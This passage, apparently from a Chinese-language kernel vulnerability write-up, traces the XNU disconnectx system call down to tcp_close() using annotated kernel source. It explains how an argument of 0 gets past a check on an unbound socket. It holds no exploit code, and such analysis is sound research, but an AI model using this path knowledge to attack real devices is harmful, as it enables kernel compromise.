&lt;span class=&quot;nf&quot;&gt;disconnectx_nocancel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disconnectx_args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;retval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#pragma unused(p, retval)
&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 2&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EBADF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sodisconnectx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;aid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 3&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;out:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;file_drop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;前后调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;socket_lock()&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;socket_unlock()&lt;/code&gt;用了锁防条件竞争，然后调用位置4的函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sodisconnectxlocked()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;sodisconnectx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sae_associd_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sae_connid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;socket_lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sodisconnectxlocked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 4&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;socket_unlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;位置5的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*so-&amp;gt;so_proto-&amp;gt;pr_usrreqs-&amp;gt;pru_disconnectx&lt;/code&gt;是一个函数&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;sodisconnectxlocked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sae_associd_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sae_connid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/*
	 * Call the protocol disconnectx handler; let it handle all
	 * matters related to the connection state of this session.
	 */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_proto&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pr_usrreqs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pru_disconnectx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 5&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;cm&quot;&gt;/*
		 * The event applies only for the session, not for
		 * the disconnection of individual subflows.
		 */&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SS_ISDISCONNECTING&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SS_ISDISCONNECTED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;sflt_notify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock_evt_disconnected&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;通过结构体初始化赋值的特征进行搜索，找到对应的实现是函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp_usr_disconnectx()&lt;/code&gt;，该函数的三个参数就是用户态传入的参数，位置6有一个条件判断，我们只需要令第二个参数为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;即可绕过，绕过判断之后，调用位置7的函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp_usr_disconnect()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define	SAE_ASSOCID_ANY	0
#define	SAE_ASSOCID_ALL	((sae_associd_t)(-1ULL))
#define	EINVAL		22		&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* Invalid argument */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;tcp_usr_disconnectx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sae_associd_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sae_connid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#pragma unused(cid)
&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;aid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SAE_ASSOCID_ANY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SAE_ASSOCID_ALL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 6&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EINVAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp_usr_disconnect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 7&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp_usr_disconnect()&lt;/code&gt;有两个宏：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;COMMON_START()&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;COMMON_END(PRU_DISCONNECT)&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;COMMON_START()&lt;/code&gt;会执行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tp = intotcpcb(inp)&lt;/code&gt;对变量&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tp&lt;/code&gt;进行赋值，所以业务逻辑上是没有问题的，然后调用位置8的函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp_disconnect()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;tcp_usr_disconnect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inpcb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sotoinpcb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcpcb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;socket_lock_assert_owned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;COMMON_START&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/* In case we got disconnected from the peer */&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcp_disconnect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 8&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;COMMON_END&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PRU_DISCONNECT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp_disconnect()&lt;/code&gt;有一个判断&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tp-&amp;gt;t_state &amp;lt; TCPS_ESTABLISHED&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tp-&amp;gt;t_state&lt;/code&gt;是Socket状态，我列举了部分，因为我们只创建了一个结构体变量&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;socket&lt;/code&gt;，并没有调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bind()&lt;/code&gt;与函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;listen()&lt;/code&gt;，所以状态为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCPS_CLOSED&lt;/code&gt;，那么这里就应该调用位置9的函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp_close()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define	TCPS_CLOSED		0	&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* closed */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#define	TCPS_LISTEN		1	&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* listening for connection */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#define	TCPS_SYN_SENT		2	&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* active, have sent syn */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#define	TCPS_SYN_RECEIVED	3	&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* have send and received syn */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* states &amp;lt; TCPS_ESTABLISHED are those where connections not established */&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#define	TCPS_ESTABLISHED	4	&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* established */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcpcb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;tcp_disconnect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcpcb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t_inpcb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp_socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_rcv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sb_cc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t_reassqlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcp_drop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t_state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TCPS_ESTABLISHED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
